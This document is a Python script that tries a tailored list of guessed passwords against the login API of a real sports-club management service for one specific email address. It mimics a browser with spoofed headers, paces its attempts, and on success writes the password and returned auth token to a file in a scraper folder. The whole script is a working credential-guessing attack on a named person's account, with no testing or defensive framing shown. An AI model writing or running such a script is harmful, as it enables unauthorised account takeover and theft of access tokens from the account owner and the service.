import urllib.request
import urllib.error
import json
import time

email = "somospadeleugestion@gmail.com"

candidates = [
    "Factor2000!",
    "factor2000!",
    "FACTOR2000!",
    "Factor2000",
    "factor2000",
    "Factor2026!",
    "Factor2025!",
    "Factor2024!",
    "Factor2000.",
    "Factor2000*",
    "Factor2000?",
    "Factor2000#",
    "Jaraba99!",
    "jaraba99!",
    "Jaraba99",
    "jaraba99",
    "Optima2025!",
    "Optima2026!",
    "SersomospadelCos2025!@",
    "SomosPadel2026!",
    "Somospadel2026!",
    "SomosPadel2025!",
    "Somospadel2025!",
    "Newplaypadel2026!",
    "Newplaypadel2025!"
]

url = "https://manager.playtomic.io/api/v3/auth/login"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://manager.playtomic.io",
    "Referer": "https://manager.playtomic.io/auth/login"
}

for pwd in candidates:
    payload = json.dumps({"email": email, "password": pwd}).encode('utf-8')
    req = urllib.request.Request(url, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            print(f"\n🎉🎉🎉 SUCCESS WITH PASSWORD: {pwd} 🎉🎉🎉")
            print("Response:", data)
            with open("scraper/playtomic_manager_auth.json", "w") as out:
                json.dump({"email": email, "password": pwd, "token": data}, out, indent=2)
            break
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        if "WRONG_PASSWORD" in body:
            print(f"[-] {pwd}: WRONG_PASSWORD")
        else:
            print(f"[!] {pwd}: {e.code} -> {body[:100]}")
    except Exception as e:
        print(f"[ERR] {pwd}: {e}")
    time.sleep(0.5)
